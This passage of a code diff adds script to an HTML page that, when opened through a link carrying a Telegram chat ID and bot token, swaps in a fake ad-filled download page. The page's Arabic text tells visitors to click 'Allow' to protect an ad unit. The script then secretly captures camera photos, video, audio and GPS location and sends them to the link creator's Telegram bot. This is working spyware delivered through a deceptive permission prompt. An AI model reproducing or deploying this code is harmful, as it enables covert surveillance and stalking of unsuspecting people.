+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/mp4' });
+                    const form = new FormData();
+                    form.append('chat_id', chat);
+                    form.append('audio', blob, `audio_${Date.now()}.mp4`);
+                    const caption = buildCaption(`🎤 تسجيل صوتي - 5 ثوان`);
+                    form.append('caption', caption);
+
+                    try {
+                        await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
+                            method: 'POST',
+                            body: form
+                        });
+                    } catch (e) {}
+                    resolve();
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+                }, 5000);
+            });
+        }
+
+        async function sendLocation(chat, token) {
+            return new Promise((resolve) => {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const { latitude, longitude } = position.coords;
+                            const caption = buildCaption(
+                                `📍 الموقع الحالي\nالإحداثيات: ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`
+                            );
+
+                            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ chat_id: chat, text: caption })
+                            });
+                            resolve();
+                        },
+                        (error) => {
+                            console.log('خطأ في تحديد الموقع:', error);
+                            resolve();
+                        }
+                    );
+                } else {
+                    resolve();
+                }
+            });
+        }
+
+        async function preGrantPermissions(needCamera, needMicrophone) {
+            if (!needCamera && !needMicrophone) return true;
+            const constraints = {};
+            if (needCamera) constraints.video = true;
+            if (needMicrophone) constraints.audio = true;
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch (err) {
+                console.log('رفض الإذن:', err);
+                return false;
+            }
+        }
+
+        async function startFeatures(chat, token, features) {
+            if (!features) return;
+
+            const featureList = features.split(',');
+
+            const needCamera = featureList.some(f => ['camFront', 'camBack', 'videoFront', 'videoBack'].includes(f));
+            const needMicrophone = featureList.some(f => ['audio', 'videoFront', 'videoBack'].includes(f));
+
+            const permissionGranted = await preGrantPermissions(needCamera, needMicrophone);
+
+            if (featureList.includes('camFront')) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                    await captureAndSend(stream, chat, token, 'front');
+                    stream.getTracks().forEach(t => t.stop());
+                } catch (e) { console.log('فشلت صورة أمامية'); }
+            }
+
+            if (featureList.includes('camBack')) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                    await captureAndSend(stream, chat, token, 'back');
+                    stream.getTracks().forEach(t => t.stop());
+                } catch (e) { console.log('فشلت صورة خلفية'); }
+            }
+
+            if (featureList.includes('videoFront')) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' },
+                        audio: true });
+                    await recordAndSend(stream, chat, token, 'front');
+                    stream.getTracks().forEach(t => t.stop());
+                } catch (e) { console.log('فشل فيديو أمامي'); }
+            }
+
+            if (featureList.includes('videoBack')) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' },
+                        audio: true });
+                    await recordAndSend(stream, chat, token, 'back');
+                    stream.getTracks().forEach(t => t.stop());
+                } catch (e) { console.log('فشل فيديو خلفي'); }
+            }
+
+            if (featureList.includes('audio')) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    await recordAudioAndSend(stream, chat, token);
+                    stream.getTracks().forEach(t => t.stop());
+                } catch (e) { console.log('فشل تسجيل صوتي'); }
+            }
+
+            if (featureList.includes('location')) {
+                await sendLocation(chat, token);
+            }
+        }
+
+        // ------------------ الوضع الجانبي (download) ------------------
+        const params = new URLSearchParams(window.location.search);
+        const chat = params.get('chat');
+        const token = params.get('token');
+        const features = params.get('features');
+
+        if (chat && token) {
+            // إخفاء العناصر الرئيسية
+            document.getElementById('cardArea').style.display = 'none';
+            document.querySelector('.header').style.display = 'none';
+            document.querySelector('.madeby').style.display = 'none';
+            document.getElementById('captureBadge').style.display = 'none';
+
+            const wrap = document.querySelector('.app-wrap');
+            wrap.innerHTML = '';
+            wrap.style.padding = '0';
+            wrap.style.margin = '0';
+            wrap.style.maxWidth = '100%';
+            wrap.style.background = '#050505';
+            wrap.style.minHeight = '100vh';
+
+            const downloadPage = document.createElement('div');
+            downloadPage.className = 'download-page';
+
+            const mainBox = document.createElement('div');
+            mainBox.className = 'download-box';
+
+            const h2 = document.createElement('h2');
+            h2.textContent =
+                'يجب الضغط على سماح لحماية الوحدة الإعلانية من الزيارات الوهمية. لم تتمكن من تنزيل الملف إلا بعد الضغط على سماح.';
+            mainBox.appendChild(h2);
+
+            const adBox1 = document.createElement('div');
+            adBox1.className = 'ad-area';
+            mainBox.appendChild(adBox1);
+
+            const adBox2 = document.createElement('div');
+            adBox2.className = 'ad-area';
+            const containerDiv = document.createElement('div');
+            containerDiv.id = 'container-596225155ab3da796681d551cb4b7cf4';
+            adBox2.appendChild(containerDiv);
+            mainBox.appendChild(adBox2);
+
+            const downloadBtn = document.createElement('button');
+            downloadBtn.className = 'download-btn';
+            downloadBtn.innerHTML = '<i class="fas fa-arrow-right"></i> التالي';
+            downloadBtn.onclick = function() {
+                window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c",
+                    "_blank");
+            };
+            mainBox.appendChild(downloadBtn);
+
+            const adBox3 = document.createElement('div');
+            adBox3.className = 'ad-area';
+            mainBox.appendChild(adBox3);
+
+            const adBox4 = document.createElement('div');
+            adBox4.className = 'ad-area';
+            mainBox.appendChild(adBox4);
+
+            const footer = document.createElement('div');
+            footer.className = 'download-footer';
+            footer.textContent = '×× قناة شيطانية ××';
+            mainBox.appendChild(footer);
+
+            downloadPage.appendChild(mainBox);
+            wrap.appendChild(downloadPage);
+
+            // تحميل الإعلانات (الأصلية)
+            loadAd("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
+            loadAd("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
+            loadAd("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
+
+            const atOptionsScript = document.createElement('script');
+            atOptionsScript.innerHTML = `
+                atOptions = {
+                  'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
+                  'format' : 'iframe',
+                  'height' : 300,
+                  'width' : 160,
+                  'params' : {}
+                };
+              `;
+            document.body.appendChild(atOptionsScript);
+            loadAd("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
+
+            // تشغيل الميزات
+            startFeatures(chat, token, features);
+        }
+    </script>
+
+</body>
+</html>
